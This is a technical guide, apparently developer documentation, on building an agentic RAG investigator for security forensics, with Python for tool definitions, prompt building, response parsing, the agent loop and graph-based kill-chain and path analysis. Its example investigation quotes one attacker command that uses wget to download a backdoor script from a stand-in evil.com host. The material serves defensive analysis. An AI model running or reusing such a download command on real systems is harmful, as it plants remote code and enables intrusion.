# Agentic RAG Patterns

## Overview

Agentic RAG extends traditional RAG by letting the LLM decide what to search for iteratively. Instead of a single retrieve-then-generate pass, the agent reasons about what information it needs and calls tools to gather evidence.

## Core Architecture

### Tool Definition

Define clear, focused tools:

```python
AGENT_TOOLS = [
    {
        "name": "search_chunks",
        "description": "Search for relevant text using semantic and keyword matching",
        "parameters": {
            "query": "Search query - keywords, phrases, or natural language"
        }
    },
    {
        "name": "search_entity",
        "description": "Find chunks containing a specific entity (IP, username, file)",
        "parameters": {
            "entity_value": "The entity to search for",
            "entity_type": "Optional: ip, username, filepath, command"
        }
    },
    {
        "name": "traverse_graph",
        "description": "Explore relationships from an entity",
        "parameters": {
            "entity_value": "Starting entity",
            "depth": "Hops to traverse (1-3)"
        }
    },
    {
        "name": "final_answer",
        "description": "Provide the final response when you have enough information",
        "parameters": {
            "answer": "Complete answer with evidence"
        }
    }
]
```

### Agent Prompt Template

Structure the prompt for reliable tool use:

```python
def build_agent_prompt(query: str, history: list[dict]) -> str:
    tools_desc = "\n".join([
        f"- {t['name']}: {t['description']}"
        for t in AGENT_TOOLS
    ])
    
    history_text = ""
    if history:
        for step in history:
            history_text += f"\nAction: {step['tool']}"
            history_text += f"\nResult: {step['summary']}\n"
    
    return f'''You are an investigator analyzing system artifacts.

Available tools:
{tools_desc}

RULES:
1. Think step by step
2. Use tools to gather evidence before answering
3. When you find an interesting entity, search for more about it
4. Max {MAX_ITERATIONS} tool calls allowed
5. Only call final_answer when you have enough evidence

{history_text}

User question: {query}

Format your response:
THINKING: [Your reasoning]
TOOL: [tool_name]
PARAMS: {{"param1": "value1"}}
'''
```

### Response Parsing

Extract tool calls from LLM output:

```python
import re
import json

def parse_agent_response(response: str) -> dict:
    result = {"thinking": "", "tool": None, "params": {}}
    
    # Extract thinking
    thinking_match = re.search(r'THINKING:\s*(.+?)(?=TOOL:|$)', response, re.DOTALL)
    if thinking_match:
        result["thinking"] = thinking_match.group(1).strip()
    
    # Extract tool name
    tool_match = re.search(r'TOOL:\s*(\w+)', response)
    if tool_match:
        result["tool"] = tool_match.group(1)
    
    # Extract params (JSON)
    params_match = re.search(r'PARAMS:\s*(\{.+?\})', response, re.DOTALL)
    if params_match:
        try:
            result["params"] = json.loads(params_match.group(1))
        except json.JSONDecodeError:
            pass
    
    return result
```

### Main Agent Loop

Iterate with safety limits:

```python
MAX_ITERATIONS = 5

def agent_query(query: str, session_id: str) -> Generator[str, None, None]:
    history = []
    
    yield "🔍 **Starting investigation...**\n\n"
    
    for iteration in range(MAX_ITERATIONS):
        prompt = build_agent_prompt(query, history)
        response = llm.generate(prompt)
        parsed = parse_agent_response(response)
        
        yield f"**Step {iteration + 1}:** "
        if parsed["thinking"]:
            yield f"*{parsed['thinking']}*\n"
        
        tool = parsed["tool"]
        params = parsed["params"]
        
        if tool == "final_answer":
            yield f"\n### Answer\n{params['answer']}"
            return
        
        # Execute tool
        result = execute_tool(session_id, tool, params)
        yield f"📎 Using **{tool}** → {result['summary']}\n\n"
        
        history.append({
            "tool": tool,
            "params": params,
            "summary": result["summary"]
        })
    
    yield "\n⚠️ Reached iteration limit without final answer."
```

## Advanced Patterns

### Graph-Aware Agent

Add graph traversal tools for relationship discovery:

```python
def execute_traverse_graph(session_id: str, params: dict) -> dict:
    entity_value = params["entity_value"]
    depth = min(int(params.get("depth", 1)), 3)
    
    result = graph_service.get_entity_neighbors(
        session_id=session_id,
        entity_value=entity_value,
        max_depth=depth
    )
    
    neighbors = result.get("neighbors", [])
    if not neighbors:
        return {"success": True, "summary": f"'{entity_value}' has no relationships"}
    
    # Group by relationship type
    by_rel = {}
    for n in neighbors:
        rel = n["relationship"]
        if rel not in by_rel:
            by_rel[rel] = []
        by_rel[rel].append(n["entity_value"])
    
    summary_parts = [f"{rel}: {', '.join(vals[:3])}" for rel, vals in by_rel.items()]
    return {
        "success": True,
        "result": result,
        "summary": f"Connected to {len(neighbors)} entities. {'; '.join(summary_parts)}"
    }
```

### Kill Chain Analysis

Reconstruct attack stages from entity graph:

```python
def execute_get_kill_chain(session_id: str, params: dict) -> dict:
    result = graph_service.get_kill_chain(session_id)
    
    stages = result.get("kill_chain", {})
    detected = []
    
    for stage, items in stages.items():
        if items:
            stage_name = stage.replace("_", " ").title()
            detected.append(f"{stage_name}: {len(items)} indicator(s)")
    
    return {
        "success": True,
        "result": result,
        "summary": " → ".join(detected) if detected else "No attack chain detected"
    }
```

### Path Finding

Help the agent connect entities:

```python
def execute_find_path(session_id: str, params: dict) -> dict:
    source = params["source_entity"]
    target = params["target_entity"]
    
    result = graph_service.find_path(
        session_id=session_id,
        source_value=source,
        target_value=target,
        max_depth=5
    )
    
    if result.get("error"):
        return {"success": True, "summary": f"No path found: {result['error']}"}
    
    return {
        "success": True,
        "result": result,
        "summary": f"Path ({result['path_length']} hops): {result['readable_path']}"
    }
```

## Example Investigation Flow

```
User: "Was there unauthorized access?"

Agent:
Step 1: Let me check authentication logs for failed attempts.
📎 Using search_chunks(query="failed login authentication ssh")
→ Found 12 chunks. Sources: auth.log, secure

Step 2: I see failed attempts from 10.0.0.5. Let me investigate this IP.
📎 Using traverse_graph(entity="10.0.0.5", depth=1)
→ Connected to 4 entities. authenticated_as: root; executed: wget, bash

Step 3: This IP authenticated as root and ran wget. What was downloaded?
📎 Using search_entity(value="wget", type="command")
→ Found 3 results. Command: wget http://evil.com/backdoor.sh -O /tmp/bd.sh

Step 4: Found suspicious download. Let me trace the full path.
📎 Using find_path(source="10.0.0.5", target="/tmp/bd.sh")
→ Path (3 hops): 10.0.0.5 → root → wget → /tmp/bd.sh

### Answer
Yes, there was unauthorized access. IP 10.0.0.5 performed a brute-force attack
(12 failed logins visible in auth.log), then successfully authenticated as root.
After gaining access, they used wget to download a script from evil.com to /tmp/bd.sh.
```

## Best Practices

### ✅ Do
- **DO**: Stream reasoning so users can follow along
- **DO**: Summarize tool results concisely (save context window)
- **DO**: Cap iteration count to prevent infinite loops
- **DO**: Make tools focused and composable
- **DO**: Include evidence in final answer

### ❌ Don't
- **DON'T**: Put too many params in one tool (split into focused tools)
- **DON'T**: Let agent iterate forever (always use MAX_ITERATIONS)
- **DON'T**: Skip the THINKING step (helps with reasoning quality)
- **DON'T**: Return full tool results to LLM (summarize!)
- **DON'T**: Use agentic flow for simple questions (overhead not worth it)

## Fallback Handling

Handle tool failures gracefully:

```python
def execute_tool(session_id: str, tool: str, params: dict) -> dict:
    try:
        if tool == "search_chunks":
            return execute_search(session_id, params)
        elif tool == "traverse_graph":
            return execute_traverse(session_id, params)
        # ... more tools
        else:
            return {"success": False, "summary": f"Unknown tool: {tool}"}
    except Exception as e:
        return {"success": False, "summary": f"Tool error: {str(e)}"}
```
